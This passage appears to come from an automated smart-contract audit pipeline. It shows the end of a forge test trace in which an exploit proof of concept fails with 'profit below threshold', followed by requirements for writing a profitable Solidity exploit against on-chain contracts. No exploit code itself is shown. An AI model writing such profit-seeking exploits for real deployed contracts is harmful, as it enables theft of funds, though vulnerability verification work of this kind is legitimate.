    │   ├─ [537] 0xE41d2489571d322189246DaFA5ebDe1F4699F498::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [813] 0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [649] 0x408e41876cCCDC0F92210600ef50372656052a38::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1192] 0x0AbdAce70D3790235af448C88547603b945604ea::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [556] 0x6DEA81C8171D0bA574754EF6F8b412F2Ed88c54D::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [468] 0xBA11D00c5f74255f56a5E366F4F77f5A186d7f55::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [607] 0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA::balanceOf(0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [373] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2396] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x54f25546260C7539088982bcF4b7dC8EDEF19f21
  at 0xC011A72400E58ecD99Ee497CF89E3775d4bd732F.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 24.19s (24.17s CPU time)

Ran 1 test suite in 24.21s (24.19s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1233913)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
